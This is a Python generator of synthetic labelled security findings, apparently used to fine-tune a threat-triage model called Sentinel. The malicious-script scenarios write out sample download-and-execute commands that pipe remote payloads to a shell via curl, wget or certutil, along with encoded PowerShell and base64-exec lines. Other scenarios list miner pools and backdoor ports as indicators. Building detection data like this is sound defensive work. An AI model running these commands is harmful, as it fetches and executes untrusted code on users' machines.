"""
Synthetic dataset generator for Sentinel.

Labels are correct by construction: each scenario function knows the right
answer, so there is no label noise and no API calls needed. Inputs are shaped
exactly like what Luke's scanners will emit (see contract + the input notes in
the README), so the fine-tune transfers to production.

Mix (configurable): ~45% real threats spread over all 16 types, ~40% benign,
~15% HARD NEGATIVES (benign things that look like threats: a game pinning the
CPU, VS Code spawning PowerShell, Steam rewriting thousands of files, Plex's
open ports, a new phone on Wi-Fi). Hard negatives are what stop the tool from
crying wolf, which is the difference between a security product people keep and
one they mute.

Grounding: attacker patterns follow MITRE ATT&CK technique shapes and the
living "built-in tools abused by attackers" lists (LOLBAS on Windows, GTFOBins
on Linux, LOOBins on macOS). Names like kdevtmpfsi / kinsing are real Linux
miner droppers; masquerading-from-a-user-dir, office-spawns-shell, and
entropy-spike-with-ransom-note are textbook shapes.

Run:  python generate_dataset.py --out data --train 420 --dev 80 --test 80
"""

from __future__ import annotations

import argparse
import json
import os as _os
import random
from typing import Any, Callable

from contract import (
    build_messages,
    canonical_key,
    validate_output,
    ALL_THREAT_TYPES,
    SEVERITIES,
)

# ---------------------------------------------------------------------------
# OS-specific pools
# ---------------------------------------------------------------------------

SYS_PROCS = {
    "windows": ["svchost.exe", "lsass.exe", "services.exe", "csrss.exe", "winlogon.exe"],
    "macos": ["launchd", "WindowServer", "mds_stores", "coreaudiod", "cfprefsd"],
    "linux": ["systemd", "sshd", "cron", "dbus-daemon", "gnome-shell"],
}
SYS_DIRS = {
    "windows": [r"C:\Windows\System32", r"C:\Windows\SysWOW64"],
    "macos": ["/usr/libexec", "/usr/sbin", "/System/Library/CoreServices"],
    "linux": ["/usr/bin", "/usr/sbin", "/usr/lib/systemd"],
}
USER_TMP_DIRS = {
    "windows": [r"C:\Users\danny\Downloads", r"C:\Users\danny\AppData\Local\Temp", r"C:\Users\Public"],
    "macos": ["/Users/danny/Downloads", "/tmp", "/private/var/folders/x1"],
    "linux": ["/home/danny/Downloads", "/tmp", "/dev/shm", "/var/tmp"],
}
LEGIT_APPS = {
    "windows": [
        ("chrome.exe", r"C:\Program Files\Google\Chrome\Application", "Google LLC"),
        ("Code.exe", r"C:\Users\danny\AppData\Local\Programs\Microsoft VS Code", "Microsoft Corporation"),
        ("steam.exe", r"C:\Program Files (x86)\Steam", "Valve Corp."),
        ("Discord.exe", r"C:\Users\danny\AppData\Local\Discord\app-1.0", "Discord Inc."),
        ("Spotify.exe", r"C:\Users\danny\AppData\Roaming\Spotify", "Spotify AB"),
    ],
    "macos": [
        ("Google Chrome Helper", "/Applications/Google Chrome.app/Contents", "Google LLC"),
        ("Code Helper", "/Applications/Visual Studio Code.app/Contents", "Microsoft Corporation"),
        ("Spotify", "/Applications/Spotify.app/Contents/MacOS", "Spotify AB"),
        ("steam_osx", "/Users/danny/Library/Application Support/Steam", "Valve Corp."),
    ],
    "linux": [
        ("code", "/usr/share/code", "Microsoft Corporation"),
        ("firefox", "/usr/lib/firefox", "Mozilla"),
        ("steam", "/home/danny/.steam/steam", "Valve Corp."),
        ("dockerd", "/usr/bin", "Docker Inc."),
    ],
}
GAMES = {
    "windows": [("Cyberpunk2077.exe", r"C:\Program Files (x86)\Steam\steamapps\common\Cyberpunk 2077")],
    "macos": [("BaldursGate3", "/Users/danny/Library/Application Support/Steam/steamapps")],
    "linux": [("eldenring.exe", "/home/danny/.steam/steam/steamapps/common")],
}
MINER_PORTS = [3333, 4444, 5555, 7777, 14444, 45700]
MINER_HOSTS = ["pool.minexmr.com", "xmr.pool.gntl.uk", "pool.supportxmr.com", "45.9.148.117"]
LINUX_MINER_NAMES = ["kdevtmpfsi", "kinsing", "xmrig", ".x/httpd"]


def _id(rng: random.Random, source: str) -> str:
    return f"{source[:4]}-{rng.randint(10000, 99999)}"


def _b64(rng: random.Random, n: int = 24) -> str:
    alpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    return "".join(rng.choice(alpha) for _ in range(n)) + "=="


def _pick(rng: random.Random, seq):
    return rng.choice(seq)


def _join(osn: str, base: str, name: str) -> str:
    sep = "\\" if osn == "windows" else "/"
    return f"{base.rstrip(chr(92)+'/')}{sep}{name}"


# ---------------------------------------------------------------------------
# Scenario functions. Each returns (source, finding_fields, target_core, scenario_name)
# target_core = evidence/threat_type/severity/confidence/actions/explanation/escalate
# ---------------------------------------------------------------------------

# ---- PROCESSES: threats -------------------------------------------------

def s_cryptominer(rng, osn):
    port = _pick(rng, MINER_PORTS)
    host = _pick(rng, MINER_HOSTS)
    mins = rng.randint(14, 90)
    cpu = rng.randint(82, 99)
    if osn == "linux":
        name = _pick(rng, LINUX_MINER_NAMES)
        path = _join(osn, _pick(rng, USER_TMP_DIRS[osn]), name.split("/")[-1])
    else:
        name = _pick(rng, SYS_PROCS[osn]) if rng.random() < 0.5 else ("xmrig.exe" if osn == "windows" else "xmrig")
        path = _join(osn, _pick(rng, USER_TMP_DIRS[osn]), name)
    f = {
        "name": name, "pid": rng.randint(1000, 60000),
        "exe_path": path, "cpu_pct": cpu, "cpu_high_minutes": mins,
        "mem_mb": rng.randint(80, 400), "signed": False,
        "remote_endpoints": [f"{host}:{port}"], "is_new": True,
    }
    t = dict(
        evidence=[
            f"{cpu}% CPU sustained for {mins} minutes",
            f"outbound connection to {host}:{port}, a known mining-pool port",
            f"unsigned binary running from {path}",
        ],
        threat_type="cryptominer", severity="high", confidence="high",
        actions=["kill_process", "quarantine_file"],
        explanation="A hidden program is secretly using your computer to mine cryptocurrency.",
        escalate=False,
    )
    return "processes", f, t, "cryptominer"


def s_masquerading(rng, osn):
    name = _pick(rng, SYS_PROCS[osn])
    baddir = _pick(rng, USER_TMP_DIRS[osn])
    f = {
        "name": name, "pid": rng.randint(1000, 60000),
        "exe_path": _join(osn, baddir, name),
        "parent_name": _pick(rng, ["explorer.exe", "bash", "launchd", "unknown"]),
        "signed": False, "cpu_pct": rng.randint(1, 30), "is_new": True,
    }
    t = dict(
        evidence=[
            f"process named '{name}' is a core system name",
            f"but it runs from {baddir}, not a system directory",
            "binary is not digitally signed",
        ],
        threat_type="masquerading", severity="high", confidence="high",
        actions=["kill_process", "quarantine_file"],
        explanation="A program is disguising itself as a trusted system file to avoid being noticed.",
        escalate=False,
    )
    return "processes", f, t, "masquerading"


def s_malicious_script(rng, osn):
    if osn == "windows":
        name = "powershell.exe"
        cmd = _pick(rng, [
            f"powershell.exe -nop -w hidden -enc {_b64(rng)}",
            f"powershell -EncodedCommand {_b64(rng)}",
            "cmd /c certutil -urlcache -f http://185.22.14.3/a.exe b.exe",
        ])
        parent = _pick(rng, ["WINWORD.EXE", "EXCEL.EXE", "OUTLOOK.EXE"])
    elif osn == "macos":
        name = "osascript"
        cmd = _pick(rng, ["bash -c \"curl -s http://185.22.14.3/i | sh\"", f"python3 -c 'exec(__import__(\"base64\").b64decode(\"{_b64(rng)}\"))'"])
        parent = _pick(rng, ["Microsoft Word", "Mail", "Terminal"])
    else:
        name = "bash"
        cmd = _pick(rng, ["bash -c \"wget -qO- http://185.22.14.3/i | bash\"", f"echo {_b64(rng)} | base64 -d | sh"])
        parent = _pick(rng, ["libreoffice", "cron", "sshd"])
    f = {
        "name": name, "pid": rng.randint(1000, 60000),
        "cmdline": cmd, "parent_name": parent, "signed": True, "is_new": True,
    }
    t = dict(
        evidence=[
            f"launched by {parent}, which should not be starting a shell",
            "command line is obfuscated / downloads and runs remote code",
        ],
        threat_type="malicious_script", severity="high", confidence="high",
        actions=["kill_process", "guide_user"],
        explanation="A document on your computer tried to secretly download and run a hidden program.",
        escalate=False,
    )
    return "processes", f, t, "malicious_script"


def s_rat(rng, osn):
    ip = f"{rng.randint(80,200)}.{rng.randint(1,254)}.{rng.randint(1,254)}.{rng.randint(1,254)}"
    port = _pick(rng, [4444, 5555, 8080, 1337, 6666])
    name = _pick(rng, ["chrome_update.exe", "svhost.exe", "helper", "systemd-worker"])
    f = {
        "name": name, "pid": rng.randint(1000, 60000),
        "exe_path": _join(osn, _pick(rng, USER_TMP_DIRS[osn]), name),
        "signed": False, "remote_endpoints": [f"{ip}:{port}"],
        "listening": True, "is_new": True,
    }
    t = dict(
        evidence=[
            f"unsigned program keeping an open connection to {ip}:{port}",
            "listening for inbound connections like a remote-control tool",
            "recently appeared and not a known application",
        ],
        threat_type="remote_access_tool", severity="high", confidence="medium",
        actions=["kill_process", "disconnect_network"],
        explanation="An unknown program may be giving someone remote control of your computer.",
        escalate=False,
    )
    return "processes", f, t, "remote_access_tool"


# ---- PROCESSES: benign + hard negatives ---------------------------------

def s_proc_benign(rng, osn):
    name, path, signer = _pick(rng, LEGIT_APPS[osn])
    f = {
        "name": name, "pid": rng.randint(1000, 60000), "exe_path": f"{path}",
        "signed": True, "signer": signer, "cpu_pct": rng.randint(0, 25),
        "mem_mb": rng.randint(50, 900), "is_new": False,
    }
    t = dict(
        evidence=[f"signed by {signer}", f"running from its normal install location {path}"],
        threat_type="none", severity="none", confidence="high",
        actions=[], explanation="This is a normal, trusted application running as expected.",
        escalate=False,
    )
    return "processes", f, t, "benign_process"


def hn_game_cpu(rng, osn):
    name, path = _pick(rng, GAMES[osn])
    cpu = rng.randint(85, 100)
    f = {
        "name": name, "pid": rng.randint(1000, 60000), "exe_path": _join(osn, path, name),
        "signed": True, "signer": "Valve Corp.", "cpu_pct": cpu,
        "cpu_high_minutes": rng.randint(15, 120), "remote_endpoints": ["steamcommunity.com:443"],
        "is_new": False,
    }
    t = dict(
        evidence=[
            f"{cpu}% CPU is expected for a game",
            f"signed and running from the Steam games folder {path}",
            "no connection to any mining pool",
        ],
        threat_type="none", severity="none", confidence="medium",
        actions=["monitor"],
        explanation="This is just a game using a lot of your computer's power, which is normal.",
        escalate=False,
    )
    return "processes", f, t, "hard_neg_game_cpu"


def hn_devtool_shell(rng, osn):
    if osn == "windows":
        name, parent = "powershell.exe", "Code.exe"
    elif osn == "macos":
        name, parent = "zsh", "Code Helper"
    else:
        name, parent = "bash", "code"
    f = {
        "name": name, "pid": rng.randint(1000, 60000),
        "cmdline": _pick(rng, ["npm run dev", "python manage.py runserver", "git status"]),
        "parent_name": parent, "signed": True, "is_new": False,
    }
    t = dict(
        evidence=[
            f"the shell was started by {parent}, a code editor, which is normal for development",
            "command line is an ordinary developer command, not obfuscated",
        ],
        threat_type="none", severity="none", confidence="medium",
        actions=[], explanation="Your code editor opened a terminal to run a normal developer command.",
        escalate=False,
    )
    return "processes", f, t, "hard_neg_devtool_shell"


# ---- STORAGE: threats ---------------------------------------------------

def s_ransomware(rng, osn):
    cnt = rng.randint(120, 4000)
    ext = _pick(rng, [".locked", ".encrypted", ".crypt", ".wncry", ".axx"])
    ent = round(rng.uniform(7.6, 7.99), 2)
    note = _pick(rng, ["README_DECRYPT.txt", "HOW_TO_RECOVER.html", "!!!READ_ME!!!.txt"])
    f = {
        "kind": "burst", "event": "modified", "count": cnt, "window_sec": rng.randint(20, 180),
        "dirs_affected": rng.randint(5, 60), "ext_changes": [ext], "avg_entropy": ent,
        "note_files": [note], "written_by": _pick(rng, ["unknown.exe", "python", "wscript.exe"]),
    }
    t = dict(
        evidence=[
            f"{cnt} files rewritten in under {f['window_sec']}s with near-random content (entropy {ent})",
            f"files given a '{ext}' extension",
            f"ransom note '{note}' dropped in affected folders",
        ],
        threat_type="ransomware", severity="critical", confidence="high",
        actions=["kill_process", "disconnect_network"],
        explanation="Your files are being locked up by ransomware right now, and it needs to be stopped immediately.",
        escalate=False,
    )
    return "storage", f, t, "ransomware"


def s_malicious_download(rng, osn):
    base = _pick(rng, ["invoice", "setup", "resume", "update", "crack"])
    name = f"{base}.pdf.exe" if osn == "windows" else f"{base}.pkg"
    url = _pick(rng, ["http://185.22.14.3/dl", "http://freefiles.ru/x", "http://bit.ly/3xq"])
    f = {
        "kind": "file", "path": _join(osn, _pick(rng, USER_TMP_DIRS[osn]), name),
        "event": "new", "extension": ".exe" if osn == "windows" else ".pkg",
        "size_bytes": rng.randint(200_000, 9_000_000), "is_executable": True,
        "origin_url": url, "signed": False, "is_new": True,
    }
    t = dict(
        evidence=[
            f"newly downloaded executable from {url}",
            ("double extension disguises an .exe as a PDF" if osn == "windows" else "unsigned installer from an untrusted site"),
        ],
        threat_type="malicious_download", severity="high", confidence="medium",
        actions=["quarantine_file", "guide_user"],
        explanation="A file you just downloaded looks like disguised malware and should not be opened.",
        escalate=False,
    )
    return "storage", f, t, "malicious_download"


def s_mass_deletion(rng, osn):
    cnt = rng.randint(200, 5000)
    f = {
        "kind": "burst", "event": "deleted", "count": cnt, "window_sec": rng.randint(10, 120),
        "dirs_affected": rng.randint(3, 40), "written_by": _pick(rng, ["unknown.exe", "bash", "cmd.exe"]),
        "avg_entropy": 0.0,
    }
    t = dict(
        evidence=[
            f"{cnt} files deleted across {f['dirs_affected']} folders in under {f['window_sec']}s",
            f"deletions driven by {f['written_by']}, not a normal cleanup tool",
        ],
        threat_type="mass_deletion", severity="high", confidence="medium",
        actions=["guide_user", "restore_backup"],
        explanation="Something is rapidly deleting a lot of your files, which may be an attack.",
        escalate=False,
    )
    return "storage", f, t, "mass_deletion"


def s_system_tampering(rng, osn):
    sysdir = _pick(rng, SYS_DIRS[osn])
    target = _pick(rng, {
        "windows": ["drivers\\etc\\hosts", "Tasks\\UpdateTask", "config\\SAM"],
        "macos": ["LaunchDaemons/com.x.plist", "sudoers.d/99x"],
        "linux": ["cron.d/root", "ld.so.preload", "systemd/system/x.service"],
    }[osn])
    f = {
        "kind": "file", "path": _join(osn, sysdir, target), "event": "modified",
        "written_by": _pick(rng, ["unknown.exe", "bash", "python"]), "signed": False, "is_new": False,
    }
    t = dict(
        evidence=[
            f"a protected system file was modified: {sysdir}/{target}",
            f"the change was made by {f['written_by']}, not the operating system",
        ],
        threat_type="system_file_tampering", severity="critical", confidence="medium",
        actions=["guide_user", "quarantine_file"],
        explanation="A core part of your operating system was changed by an untrusted program.",
        escalate=True,
    )
    return "storage", f, t, "system_file_tampering"


# ---- STORAGE: benign + hard negatives -----------------------------------

def s_storage_benign(rng, osn):
    name = _pick(rng, ["report.docx", "photo.jpg", "notes.md", "budget.xlsx"])
    f = {
        "kind": "file", "path": f"/Users/danny/Documents/{name}" if osn != "windows" else fr"C:\Users\danny\Documents\{name}",
        "event": _pick(rng, ["modified", "new"]), "is_executable": False,
        "size_bytes": rng.randint(10_000, 5_000_000), "written_by": _pick(rng, ["Code.exe", "WINWORD.EXE", "Preview"]),
    }
    t = dict(
        evidence=["an ordinary document was saved by a normal application", "not executable, normal content"],
        threat_type="none", severity="none", confidence="high",
        actions=[], explanation="This is just a normal file being saved.",
        escalate=False,
    )
    return "storage", f, t, "benign_storage"


def hn_game_update(rng, osn):
    cnt = rng.randint(800, 9000)
    f = {
        "kind": "burst", "event": "modified", "count": cnt, "window_sec": rng.randint(60, 600),
        "dirs_affected": rng.randint(1, 4), "avg_entropy": round(rng.uniform(3.0, 5.5), 2),
        "ext_changes": [], "note_files": [],
        "written_by": _pick(rng, ["steam.exe", "steam", "EpicGamesLauncher.exe"]),
    }
    t = dict(
        evidence=[
            f"{cnt} files updated by {f['written_by']}, a known game launcher",
            f"content entropy is {f['avg_entropy']} (normal files), not encrypted",
            "no ransom notes and no changed extensions",
        ],
        threat_type="none", severity="none", confidence="medium",
        actions=["monitor"],
        explanation="A game is updating itself, which normally changes many files at once.",
        escalate=False,
    )
    return "storage", f, t, "hard_neg_game_update"


def hn_archive_entropy(rng, osn):
    ent = round(rng.uniform(7.7, 7.98), 2)
    f = {
        "kind": "file", "path": _join(osn, _pick(rng, USER_TMP_DIRS[osn]), "backup_2026.7z"),
        "event": "new", "extension": ".7z", "size_bytes": rng.randint(5_000_000, 900_000_000),
        "avg_entropy": ent, "written_by": _pick(rng, ["7zG.exe", "Keka", "zip"]), "is_executable": False,
    }
    t = dict(
        evidence=[
            f"high entropy ({ent}) is expected for a compressed archive",
            f"created by {f['written_by']}, a normal archiving tool, as a single .7z file",
        ],
        threat_type="none", severity="none", confidence="medium",
        actions=["monitor"],
        explanation="This is a normal compressed archive, which looks scrambled but is not an attack.",
        escalate=False,
    )
    return "storage", f, t, "hard_neg_archive_entropy"


# ---- NETWORK: threats ---------------------------------------------------

def _lan_ip(rng):
    return f"192.168.{rng.randint(0,3)}.{rng.randint(2,254)}"


def s_rogue_device(rng, osn):
    f = {
        "ip": _lan_ip(rng), "mac": ":".join(f"{rng.randint(0,255):02x}" for _ in range(6)),
        "vendor": "unknown", "hostname": "", "is_gateway": False, "is_this_device": False,
        "is_new": True, "open_ports": [{"port": _pick(rng, [22, 23, 80]), "service": "telnet"}],
    }
    t = dict(
        evidence=[
            f"a new device ({f['ip']}) joined the network with an unknown vendor",
            f"it is exposing port {f['open_ports'][0]['port']}",
        ],
        threat_type="rogue_device", severity="medium", confidence="low",
        actions=["guide_user", "monitor"],
        explanation="An unfamiliar device appeared on your network and is worth checking.",
        escalate=True,
    )
    return "network", f, t, "rogue_device"


def s_exposed_service(rng, osn):
    port, svc = _pick(rng, [(3389, "rdp"), (445, "smb"), (23, "telnet"), (5900, "vnc")])
    f = {
        "ip": _lan_ip(rng), "is_this_device": True, "is_gateway": False, "is_new": False,
        "open_ports": [{"port": port, "service": svc}], "exposed_to": "wan",
    }
    t = dict(
        evidence=[
            f"this computer is exposing {svc.upper()} (port {port}) to the open internet",
            f"{svc.upper()} is a common target for remote attacks",
        ],
        threat_type="exposed_service", severity="high", confidence="high",
        actions=["close_port", "guide_user"],
        explanation=f"Your computer is leaving {svc.upper()} open to the internet, which attackers often target.",
        escalate=False,
    )
    return "network", f, t, "exposed_service"


def s_backdoor_port(rng, osn):
    port = _pick(rng, [4444, 31337, 1337, 5555, 6666])
    f = {
        "ip": _lan_ip(rng), "is_this_device": True, "is_new": True,
        "open_ports": [{"port": port, "service": "unknown"}],
        "bound_process": _pick(rng, ["unknown", "svhost.exe", "/tmp/.x"]),
    }
    t = dict(
        evidence=[
            f"this computer is listening on port {port}, commonly used by backdoors",
            f"the port is held open by an unrecognized process ({f['bound_process']})",
        ],
        threat_type="backdoor_port", severity="high", confidence="medium",
        actions=["close_port", "kill_process"],
        explanation="Your computer has opened a hidden door that could let an attacker in.",
        escalate=False,
    )
    return "network", f, t, "backdoor_port"


def s_arp_spoof(rng, osn):
    mac = ":".join(f"{rng.randint(0,255):02x}" for _ in range(6))
    f = {
        "ip": _lan_ip(rng), "mac": mac, "is_gateway": False, "is_new": True,
        "shares_mac_with": ["192.168.0.1 (gateway)"],
    }
    t = dict(
        evidence=[
            f"device {f['ip']} shares the gateway's MAC address ({mac})",
            "two devices claiming one hardware address is the signature of an interception attack",
        ],
        threat_type="arp_spoofing", severity="critical", confidence="high",
        actions=["disconnect_network", "guide_user"],
        explanation="Someone on your network may be secretly intercepting your internet traffic.",
        escalate=False,
    )
    return "network", f, t, "arp_spoofing"


# ---- NETWORK: benign + hard negatives -----------------------------------

def s_net_benign(rng, osn):
    dev = _pick(rng, [("router", True, "Netgear"), ("HP-printer", False, "HP"), ("Daniels-iPhone", False, "Apple")])
    f = {
        "ip": _lan_ip(rng), "vendor": dev[2], "hostname": dev[0],
        "is_gateway": dev[1], "is_this_device": False, "is_new": False,
        "open_ports": [] if not dev[1] else [{"port": 80, "service": "http"}],
    }
    t = dict(
        evidence=[f"{dev[0]} is a known {dev[2]} device already on the network", "nothing unusual exposed"],
        threat_type="none", severity="none", confidence="high",
        actions=[], explanation="This is a familiar device on your network behaving normally.",
        escalate=False,
    )
    return "network", f, t, "benign_network"


def hn_plex_port(rng, osn):
    f = {
        "ip": _lan_ip(rng), "is_this_device": True, "is_new": False,
        "open_ports": [{"port": 32400, "service": "plex"}], "exposed_to": "lan",
        "bound_process": _pick(rng, ["Plex Media Server.exe", "Plex Media Server"]),
    }
    t = dict(
        evidence=[
            "port 32400 is held open by Plex Media Server, which the user installed",
            "exposed only to the local network, not the internet",
        ],
        threat_type="none", severity="none", confidence="medium",
        actions=["monitor"],
        explanation="This is your Plex media server, which is supposed to be running.",
        escalate=False,
    )
    return "network", f, t, "hard_neg_plex_port"


def hn_new_phone(rng, osn):
    f = {
        "ip": _lan_ip(rng), "vendor": _pick(rng, ["Apple", "Samsung"]), "hostname": "Guests-iPhone",
        "is_gateway": False, "is_this_device": False, "is_new": True, "open_ports": [],
    }
    t = dict(
        evidence=[
            f"the new device is a recognized {f['vendor']} phone",
            "it exposes no open ports and behaves like a normal phone",
        ],
        threat_type="none", severity="none", confidence="medium",
        actions=["monitor"],
        explanation="A phone joined your Wi-Fi, which is normal when someone connects a new device.",
        escalate=False,
    )
    return "network", f, t, "hard_neg_new_phone"


# ---- BACKUPS: threats ---------------------------------------------------

def s_backup_encrypted(rng, osn):
    ent = round(rng.uniform(7.6, 7.99), 2)
    f = {
        "backup_path": _pick(rng, [r"D:\Backups", "/Volumes/Backup", "/mnt/backup"]),
        "files_total": rng.randint(500, 50000), "changed": rng.randint(400, 49000),
        "missing": 0, "added": 0, "changed_exts": [".locked", ".crypt"], "avg_entropy_changed": ent,
        "last_backup_hours": rng.randint(1, 24), "expected_interval_hours": 24,
    }
    t = dict(
        evidence=[
            f"{f['changed']} backup files changed to near-random content (entropy {ent})",
            "backup files given encrypted extensions",
        ],
        threat_type="backup_encrypted", severity="critical", confidence="high",
        actions=["disconnect_network", "guide_user"],
        explanation="Your backups are being encrypted by ransomware, which means an attack is already underway.",
        escalate=False,
    )
    return "backups", f, t, "backup_encrypted"


def s_backup_deleted(rng, osn):
    tot = rng.randint(1000, 40000)
    f = {
        "backup_path": _pick(rng, [r"D:\Backups", "/Volumes/Backup"]),
        "files_total": tot, "changed": 0, "missing": rng.randint(int(tot * 0.6), tot),
        "added": 0, "last_backup_hours": rng.randint(1, 48), "expected_interval_hours": 24,
    }
    t = dict(
        evidence=[
            f"{f['missing']} of {tot} backup files have disappeared",
            "mass backup deletion often precedes a ransom demand",
        ],
        threat_type="backup_deleted", severity="high", confidence="medium",
        actions=["run_backup", "guide_user"],
        explanation="A large part of your backups was deleted, leaving you without a safety net.",
        escalate=False,
    )
    return "backups", f, t, "backup_deleted"


def s_backup_tampering(rng, osn):
    f = {
        "backup_path": _pick(rng, [r"D:\Backups", "/mnt/backup"]),
        "files_total": rng.randint(1000, 40000), "changed": rng.randint(1, 40),
        "missing": rng.randint(1, 20), "added": 0, "changed_exts": [".bak", ".vhdx"],
        "last_backup_hours": rng.randint(1, 24), "expected_interval_hours": 24,
    }
    t = dict(
        evidence=[
            "backup files were modified and removed outside the normal backup schedule",
            "unexpected changes to backup contents suggest interference",
        ],
        threat_type="backup_tampering", severity="medium", confidence="low",
        actions=["guide_user", "run_backup"],
        explanation="Something changed your backups unexpectedly, which is worth looking into.",
        escalate=True,
    )
    return "backups", f, t, "backup_tampering"


def s_stale_backup(rng, osn):
    hrs = rng.randint(120, 2000)
    f = {
        "backup_path": _pick(rng, [r"D:\Backups", "/Volumes/Backup"]),
        "files_total": rng.randint(1000, 40000), "changed": 0, "missing": 0, "added": 0,
        "last_backup_hours": hrs, "expected_interval_hours": 24,
    }
    t = dict(
        evidence=[
            f"last successful backup was {hrs} hours ago",
            f"expected roughly every {f['expected_interval_hours']} hours",
        ],
        threat_type="stale_backup", severity="low", confidence="high",
        actions=["run_backup"],
        explanation="Your backups are badly out of date, so recent files are not protected.",
        escalate=False,
    )
    return "backups", f, t, "stale_backup"


def s_backup_benign(rng, osn):
    f = {
        "backup_path": _pick(rng, [r"D:\Backups", "/Volumes/Backup"]),
        "files_total": rng.randint(1000, 40000), "changed": rng.randint(5, 300),
        "missing": 0, "added": rng.randint(0, 200), "avg_entropy_changed": round(rng.uniform(3.0, 5.5), 2),
        "last_backup_hours": rng.randint(1, 20), "expected_interval_hours": 24,
    }
    t = dict(
        evidence=[
            "backup ran on schedule with a normal number of changed files",
            "changed files have normal (non-encrypted) content",
        ],
        threat_type="none", severity="none", confidence="high",
        actions=[], explanation="Your backup ran normally and is up to date.",
        escalate=False,
    )
    return "backups", f, t, "benign_backup"


# ---------------------------------------------------------------------------
# Registry with target mix weights
# ---------------------------------------------------------------------------

THREAT_GENS: list[Callable] = [
    s_cryptominer, s_masquerading, s_malicious_script, s_rat,
    s_ransomware, s_malicious_download, s_mass_deletion, s_system_tampering,
    s_rogue_device, s_exposed_service, s_backdoor_port, s_arp_spoof,
    s_backup_encrypted, s_backup_deleted, s_backup_tampering, s_stale_backup,
]
BENIGN_GENS: list[Callable] = [s_proc_benign, s_storage_benign, s_net_benign, s_backup_benign]
HARDNEG_GENS: list[Callable] = [
    hn_game_cpu, hn_devtool_shell, hn_game_update, hn_archive_entropy, hn_plex_port, hn_new_phone,
]

FAMILY_WEIGHTS = {"threat": 0.45, "benign": 0.40, "hardneg": 0.15}
OS_WEIGHTS = [("windows", 0.5), ("macos", 0.3), ("linux", 0.2)]
MODE_WEIGHTS = [("scheduled", 0.5), ("manual", 0.3), ("always_active", 0.2)]


def _weighted(rng, pairs):
    r = rng.random()
    acc = 0.0
    for val, w in pairs:
        acc += w
        if r <= acc:
            return val
    return pairs[-1][0]


def _make_row(rng: random.Random, gen: Callable, fam: str) -> tuple[dict, dict, dict]:
    osn = _weighted(rng, OS_WEIGHTS)
    source, fields, target_core, scenario = gen(rng, osn)
    fid = _id(rng, source)
    finding = {
        "finding_id": fid, "source": source, "os": osn,
        "mode": _weighted(rng, MODE_WEIGHTS), "finding": fields,
    }
    target = {"finding_id": fid, **target_core}
    meta = {"scenario": scenario, "family": fam, "os": osn, "source": source,
            "is_hard_negative": fam == "hardneg"}
    return finding, target, meta


def _schedule(n: int, gens: list[Callable]) -> list[Callable]:
    """Round-robin the generators so coverage is even regardless of n."""
    out = []
    i = 0
    while len(out) < n:
        out.append(gens[i % len(gens)])
        i += 1
    return out


def build_split(seed: int, n: int, seen: set[str]) -> list[dict]:
    rng = random.Random(seed)
    n_threat = round(n * FAMILY_WEIGHTS["threat"])
    n_benign = round(n * FAMILY_WEIGHTS["benign"])
    n_hard = n - n_threat - n_benign
    plan = (
        [(g, "threat") for g in _schedule(n_threat, THREAT_GENS)]
        + [(g, "benign") for g in _schedule(n_benign, BENIGN_GENS)]
        + [(g, "hardneg") for g in _schedule(n_hard, HARDNEG_GENS)]
    )
    rng.shuffle(plan)

    rows: list[dict] = []
    for gen, fam in plan:
        # retry a few times per slot if dedup collides (fields are randomized)
        for _ in range(40):
            finding, target, meta = _make_row(rng, gen, fam)
            key = canonical_key(finding)
            if key in seen:
                continue
            seen.add(key)
            assert target["threat_type"] in ALL_THREAT_TYPES
            assert target["severity"] in SEVERITIES
            errs = validate_output(target)
            assert not errs, (meta["scenario"], errs)
            rows.append({"input": finding, "target": target, "meta": meta})
            break
        else:
            raise RuntimeError(f"could not place a unique row for {gen.__name__}")
    return rows


def write_jsonl(path: str, rows: list[dict]) -> None:
    with open(path, "w", encoding="utf-8") as fh:
        for r in rows:
            fh.write(json.dumps(r, ensure_ascii=False) + "\n")


def stats(rows: list[dict]) -> dict:
    from collections import Counter
    fam = Counter(r["meta"]["family"] for r in rows)
    osc = Counter(r["meta"]["os"] for r in rows)
    tt = Counter(r["target"]["threat_type"] for r in rows)
    return {"n": len(rows), "family": dict(fam), "os": dict(osc), "threat_type": dict(tt)}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default="data")
    ap.add_argument("--train", type=int, default=420)
    ap.add_argument("--dev", type=int, default=80)
    ap.add_argument("--test", type=int, default=80)
    args = ap.parse_args()

    _os.makedirs(args.out, exist_ok=True)
    seen: set[str] = set()
    # Distinct seeds per split; shared `seen` guarantees zero cross-split overlap.
    train = build_split(1001, args.train, seen)
    dev = build_split(2002, args.dev, seen)
    test = build_split(3003, args.test, seen)

    write_jsonl(_os.path.join(args.out, "train.jsonl"), train)
    write_jsonl(_os.path.join(args.out, "eval_dev.jsonl"), dev)
    write_jsonl(_os.path.join(args.out, "eval_test.jsonl"), test)

    allstats = {"train": stats(train), "dev": stats(dev), "test": stats(test)}
    # prove the sanity check that matters: an example in build_messages round-trips
    _ = build_messages(train[0]["input"])
    with open(_os.path.join(args.out, "dataset_stats.json"), "w") as fh:
        json.dump(allstats, fh, indent=2)
    print(json.dumps(allstats, indent=2))
    # cross-split disjointness
    keys = [canonical_key(r["input"]) for r in train + dev + test]
    assert len(keys) == len(set(keys)), "cross-split overlap detected"
    print("OK: splits are disjoint; all targets valid.")


if __name__ == "__main__":
    main()
